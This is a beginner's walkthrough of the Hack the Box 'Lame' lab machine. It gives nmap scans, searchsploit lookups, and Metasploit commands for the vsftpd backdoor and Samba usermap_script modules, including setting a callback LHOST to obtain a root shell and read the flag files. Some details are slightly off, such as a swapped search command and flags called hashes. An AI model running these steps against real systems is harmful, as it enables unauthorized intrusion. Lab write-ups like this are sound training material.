#Walkthrough of Lame Machine – Hack the Box:
1.	In a new terminal window, run `nmap -sV -O -F --version-light 10.10.10.3`
![Image](/Users/ryandinnan/Desktop/Pictures/Picture1.png)
	- Another option is to open **Zenmap** and run a port scan on the same IP (to see just the information on the ports, you can go to the **Ports/Hosts** tab)
        - **Zenmap** is a program that does a really good job at visualizing and breaking down `nmap` commands into digestible bites
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture2.png)
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture3.png)
    - Now there a a LOT of different ways to use `nmap`, and being that I'm still learning you are going to be seeing a lot of different versions, but I will do my best to explain what each version does. The two versions used here I got from other tutorials and show different levels of detail when port scanning.
        - The first version we used was `nmap -sV -O -F --version-light 10.10.10.3`
            - `-sV`: Probes open ports to determine service/version info
            - `-O`: Enable OS detection
            - `-F`: Fast mode, scans fewer ports than the default scan
            - `--version-light`: Limit to most likely probes
        - The second version used (as seen in the **Zenmap** screenshot) was `nmap -A -v 10.10.10.3`
            - `-A`: Enable OS detection, version detection, script scanning, and traceroute
            - `-v`: Increase verbosity level (how detailed the process and results are)
2.	You’ll find that there are 4 available ports with different services running on them (21, 22, 139, 445)
3.	Port 21 shows **vsftpd 2.3.4**, let’s check if there are any known vulnerabilities
4.	Run command `searchsploit vsftpd 2.3.4`
	- What this does is search for any [Common Vulnerability and Exploits (CVE)](https://cve.mitre.org/about/index.html) and returns the name and location of the exploit in Kali
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture4.png)
5.	You'll see that there is one vulnerability, a *"Backdoor Command Execution"*
6.	We can try and use this vulnerability with **Metasploit**
	- **Metasploit** is a very nifty software that has a bunch of CVE exploits saved that can be run automatically
7.	Open **Metasploit** and use the command `search vsftpd 2.3.4`
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture5.png)
8.	You'll see 4 different options, and the fourth one will be our *"Backdoor Command Execution"* exploit
9.	Copy the address and run `use exploit/unix/ftp/vsftpd_234_backdoor`
10.	Type `show options` and we'll see that we need to set **RHOSTS** to the desired IP
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture6.png)
11.	Do `set rhost 10.10.10.3`
12.	If we do `show options` again, then we'll see its set and can type `run`
	- What this does is tell **Metalsploit** where to direct the exploit
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture7.png)
13.	After a little bit, we'll get a message saying, *“Exploit completed, but no session was created”*,    meaning that the exploit was attempted but didn’t' work (if we do some [research](https://www.exploit-db.com/exploits/17491), it turns out that this exploit had since been fixed which is why our attempt failed)
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture8.png)
14.	Let's continue to check the other option on port 139, **Samba**
15.	Run `search Samba 3.0.20` (which we know from our port scan) and we see two results.
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture9.png)
16.	We're going to want to focus on the first result, *"'Username map script' Command Execution"*
17.	We search that vulnerability in **Metasploit** with `searchsploit Samba 3.0.20`
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture10.png)
18.	We got a lot more options this time, but if we scroll through we see that option 15 is our *"username map script" Command Execution* vulnerability and copy the address and run `use exploit/multi/samba/usermap_script`
19.	Again we look at the settings and change the **RHOSTS** to our IP with show options and `set rhost 10.10.10.3` and then we're good to `run`
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture11.png)
20.	Chances are (unless you set it up before), you'll get the same message from when we ran the **vsftpd 2.3.4 exploit** *“Exploit completed, but no session was created”*, but if you run `show options` again, you'll see a new section
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture12.png)
21.	Now we have an **LHOST** and **LPORT** section, but the natural **LHOST** is not what we want because HTB gives us our own local IP for when we are on its VPN. You can find yours in the **Access** settings on the HTB website
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture13.png)
22.	Run `set lhost yourHtbIp` and then try `run` again
23.	You should see some new messages and after a few seconds one that says, *“Command shell session 1 opened”*, and we're in!
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture14.png)
24.	Now that we have a shell, we can check what kind of privileges we have with `whoami`

    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture15.png)
25.	Turns out we are already in as the root user! Now all we need to do is find the password hashes under user.txt and root.txt
26.	From here we have the option of either digging around in all the files and directories for what we want, or we can use this command `find / -type f -name “nameOfFile”` where nameOfFile will be replaced with user.txt and root.txt
	- This command will return the file address of whatever file you put in place of *"nameOfFile"*. We know what to search for because HTB machines often store the user and root hashes in files named user.txt and root.txt
    ![Image](/Users/ryandinnan/Desktop/Pictures/Picture16.png)
27.	Once we find the locations of the two files, we can just run `cat fileAddress` where fileAddress is what we got with the find command
28.	Take those hashes and submit them on your HTB account and get the points!

##Resources
- [Official Lame Writeup from Hack the Box](https://www.hackthebox.eu/home/machines/writeup/1)
- [Tutorial from freecodecamp.org](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
- [`nmap` Command Help](https://nmap.org/book/man-briefoptions.html)

######<font size="1">075 108 097 108 106 097 112 099 108 032 083 112 108 098 097 108 117 104 117 097 032 068 112 115 115 112 104 116 032 090 118 116 108 121 122 108 097</font>